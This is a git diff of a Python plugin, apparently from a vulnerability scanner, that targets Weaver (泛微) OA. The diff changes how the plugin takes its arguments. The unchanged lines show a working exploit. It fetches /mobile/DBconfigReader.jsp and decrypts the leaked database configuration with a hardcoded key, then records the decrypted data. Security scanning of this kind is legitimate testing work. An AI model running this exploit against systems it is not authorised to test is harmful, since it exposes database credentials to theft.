@@ -25,26 +25,13 @@ class VulnerabilityInfo(object):
         self.info['version'] = "无"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
 
-def UrlProcessing(url):
-    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
-        res = urllib.parse.urlparse(url)
-    else:
-        res = urllib.parse.urlparse('http://%s' % url)
-    return res.scheme, res.hostname, res.port
-
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=ClassCongregation.Proxies().result(proxies)
-
-    scheme, url, port = UrlProcessing(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     try:
         payload = "/mobile/DBconfigReader.jsp"
-        payload_url = scheme + "://" + url +":"+ str(port) + payload
+        payload_url = url + payload
 
         key = '1z2x3c4v5b6n'[0:8]
 
@@ -62,7 +49,7 @@ def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
             decs=k.decrypt(dec)
             Medusa = "{} 存在泛微OA_数据库配置信息泄露验证数据:\r\nUrl:{}\r\n返回数据:{}\r\n解密数据:{}".format(url,payload_url,con,decs)
             _t=VulnerabilityInfo(Medusa)
-            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
+            ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
             ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
